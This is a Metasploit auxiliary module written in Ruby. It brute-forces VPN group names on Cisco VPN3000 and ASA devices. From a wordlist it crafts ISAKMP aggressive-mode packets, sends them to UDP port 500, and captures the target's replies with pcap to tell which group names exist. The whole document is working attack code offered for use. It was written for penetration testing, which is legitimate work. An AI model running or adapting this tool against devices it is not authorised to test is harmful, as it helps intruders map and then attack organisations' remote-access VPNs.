##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'
require 'bit-struct'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Capture
	include Msf::Exploit::Remote::Udp

	def initialize
		super(
			'Name'           => 'Cisco IPSec VPN Implementation Group Name Enumeration.',
			'Description'    => %q{
								This module enumerates VPN group names from Cisco VPN3000 and Cisco ASA devices.
		},
		'Author'         => [ 'pello' ],
		'License'        => MSF_LICENSE,
		'References'     => [ [ 'URL', 'http://www.cisco.com/en/US/products/products_security_response09186a0080b5992c.html' ] ]
		)
		register_options(
			[
				OptInt.new('TIMEOUT', [ true, "The number of seconds to wait for new data.",3]),
				OptString.new('WORDLIST', [ true,  "Wordlist containing VPN group names.", '']),
				Opt::RPORT(500),
				OptString.new('INTERFACE', [false, 'The name of the interface','eth0'])
		], self.class)

		deregister_options('PCAPFILE','SNAPLEN','FILTER')

	end

	class Isakmp_header < BitStruct

		text :initiatorcookie, 64
		unsigned :respondercookie, 64, :format => "0x%x"
		unsigned :nextpayload, 8, { :default => 0x1 }
		unsigned :version, 8, { :default => 0x10 }
		unsigned :exchangetype, 8, { :default => 0x4 }
		unsigned :flags, 8, { :default => 0x0 }
		unsigned :messageid, 32, { :default => 0x0 }
		unsigned :length, 32, { :default => 0x0 }

		def initialize(*args)
			@options = []
			super
		end
	end

	class Isakmp_sa_payload < BitStruct

		unsigned :nextpayload, 8, { :default => 0x4 }
		unsigned :reserved, 8, { :default => 0x0 }
		unsigned :payloadlength, 16, { :default => 0xa4 }
		unsigned :domain, 32, { :default => 0x1 }
		unsigned :situation, 32, { :default => 0x1 }

		def initialize(*args)
			@options = []
			super
		end
	end

	class Isakmp_proposal_payload < BitStruct

		unsigned :nextpayload, 8, { :default => 0x0 }
		unsigned :reserved, 8, { :default => 0x0 }
		unsigned :payloadlength, 16, { :default => 0x98 }
		unsigned :proposalnumber, 8, { :default => 0x1 }
		unsigned :protocol, 8, { :default => 0x1 }
		unsigned :spisize, 8, { :default => 0x0 }
		unsigned :proposaltransforms, 8, { :default => 0x4 }

		def initialize(*args)
			@options = []
			super
		end
	end

	class Isakmp_transform_payload < BitStruct

		unsigned :nextpayload, 8, { :default => 0x3 }
		unsigned :reserved, 8, { :default => 0x0 }
		unsigned :payloadlength, 16, { :default => 0x0024 }
		unsigned :number, 8, { :default => 0x1 }
		unsigned :id, 8, { :default => 0x1 }
		unsigned :padding, 16, { :default => 0x0 }
		unsigned :encryption, 32, { :default => 0x80010005 }
		unsigned :hash, 32, { :default => 0x80020002 }
		unsigned :authentication, 32, { :default => 0x8003fde9 }
		unsigned :groupdescription, 32, { :default => 0x80040002 }
		unsigned :lifetype, 32, { :default => 0x800b0001 }
		unsigned :lifeduration, 64, { :default => 0x000c000400007080 }

		def initialize(*args)
			@options = []
			super
		end
	end

	class Isakmp_key_exchange_payload < BitStruct

		unsigned :nextpayload, 8, { :default => 0xa }
		unsigned :reserved, 8, { :default => 0x0 }
		unsigned :payloadlength, 16, { :default => 0x0084 }
		text :data, 1024, { :default => Rex::Text.rand_text(128,'0x0') }

		def initialize(*args)
			@options = []
			super
		end
	end

	class Isakmp_nonce_payload < BitStruct

		unsigned :nextpayload, 8, { :default => 0x5 }
		unsigned :reserved, 8, { :default => 0x0 }
		unsigned :payloadlength, 16, { :default => 0x0018 }
		text :data, 160, { :default => Rex::Text.rand_text(20,'0x0') }

		def initialize(*args)
			@options = []
			super
		end
	end

	class Isakmp_id_payload < BitStruct

		unsigned :nextpayload, 8, { :default => 0x0 }
		unsigned :reserved, 8, { :default => 0x0 }
		unsigned :payloadlength, 16, { :default => 0x0 }
		unsigned :type, 8, { :default => 0xb }
		unsigned :protocol, 8, { :default => 0x11 }
		unsigned :port, 16, { :default => 0x01f4 }
		rest :data

		def initialize(*args)
			@options = []
			super
		end
	end

	def generate_isakmp_message
		isakmp_hdr = Isakmp_header.new
		isakmp_hdr.initiatorcookie = Rex::Text.rand_text(8,'0x0')
		isakmp_hdr.respondercookie = 0x0
		isakmp_sa = Isakmp_sa_payload.new
		isakmp_proposal = Isakmp_proposal_payload.new
		isakmp_transform1 = Isakmp_transform_payload.new
		isakmp_transform2 = Isakmp_transform_payload.new
		isakmp_transform2.number = 0x2
		isakmp_transform2.hash = 0x80020001
		isakmp_transform3 = Isakmp_transform_payload.new
		isakmp_transform3.number = 0x3
		isakmp_transform3.encryption = 0x80010001
		isakmp_transform3.hash = 0x80020002
		isakmp_transform4 = Isakmp_transform_payload.new
		isakmp_transform4.number = 0x4
		isakmp_transform4.encryption = 0x80010001
		isakmp_transform4.hash = 0x80020001
		isakmp_transform4.nextpayload = 0x0
		isakmp_key_exchange = Isakmp_key_exchange_payload.new
		isakmp_nonce = Isakmp_nonce_payload.new
		isakmp_id = Isakmp_id_payload.new
		isakmp_id.payloadlength = @groupname.rstrip.length + 8
		isakmp_id.data = @groupname.rstrip

		isakmp_hdr.length = 356 + isakmp_id.data.length

		payload = ""
		payload << isakmp_hdr
		payload << isakmp_sa
		payload << isakmp_proposal
		payload << isakmp_transform1
		payload << isakmp_transform2
		payload << isakmp_transform3
		payload << isakmp_transform4
		payload << isakmp_key_exchange
		payload << isakmp_nonce
		payload << isakmp_id

		return payload
	end


	def check_dpd(pkt)
		pkt2hex = pkt.unpack('C'*pkt.length).collect {|x| x.to_s 16}.join
		if pkt2hex =~ /afcad71368a1f1c96b8696fc77571/
			return true
		else
			return false
		end
	end

	def build_ipsec_pkt

		payload = generate_isakmp_message
		connect_udp
		pcap = Pcap::open_live(datastore['INTERFACE'], 1500, false, datastore['TIMEOUT'].to_i)
		pcap.setfilter("src host #{datastore['RHOST']} and udp port 500")
		udp_sock.put(payload)
		disconnect_udp
		begin
			Timeout.timeout(datastore['TIMEOUT'].to_i) do
				pcap.each do |r|
					close_pcap
					if check_dpd(r)
						return true
					else
						return false
					end
				end
			end
		rescue Timeout::Error
			close_pcap
			print_status("No reply received. The following group is discovered: " << @groupname.to_s)
			return false
		end
	end

	def check_reachability

		ipsecport = datastore['RPORT']
		datastore['RPORT'] = 62515
		pkt = "\x00\x00\xa5\x4b\x01\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00"
		print_status("Sending VPN client log UDP request to #{datastore['RHOST']}")
		connect_udp
		datastore['RPORT'] = ipsecport

		pcap = Pcap::open_live(datastore['INTERFACE'], 1500, false, datastore['TIMEOUT'].to_i)
		pcap.setfilter("icmp[icmptype] == icmp-unreach and host #{datastore['RHOST']}")
		udp_sock.put(pkt)
		disconnect_udp
		begin
			Timeout.timeout(datastore['TIMEOUT'].to_i) do
				pcap.each do |r|
					print_error("No response from the Cisco VPN remote peer.")
					close_pcap
					return false
				end
			end
		rescue Timeout::Error
			close_pcap
			print_status("Cisco VPN remote peer is ready.")
		end
	end

	def run
		open_pcap unless self.capture

		groupnames = Array.new
		File.open(datastore['WORDLIST'],"rb").each_line do |line|
			groupnames << line
		end

		if check_reachability
			print_status("Starting...")
			groupnames.each do |groupname|
				@groupname = groupname
				if build_ipsec_pkt
					print_status("The following group is discovered: " << @groupname.to_s)
				end
			end
		end

	end


end
